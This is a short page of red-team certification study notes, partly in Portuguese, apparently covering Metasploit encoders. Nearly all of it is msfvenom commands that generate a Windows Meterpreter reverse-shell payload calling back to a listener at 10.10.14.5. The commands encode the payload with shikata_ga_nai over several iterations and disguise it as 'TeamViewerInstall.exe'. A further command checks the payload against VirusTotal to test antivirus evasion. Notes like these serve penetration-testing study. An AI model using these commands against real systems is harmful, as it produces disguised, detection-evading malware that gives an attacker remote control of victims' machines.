> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/using-metasploit-framework/encoders.md).

# Encoders

* **Shikata Ga Nai Encoding**

```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

* Uma opção melhor seria tentar executá-lo por meio de múltiplas iterações do mesmo esquema de codificação:

```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

* Analisar payloads com uma api do virus-total

```sh
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```
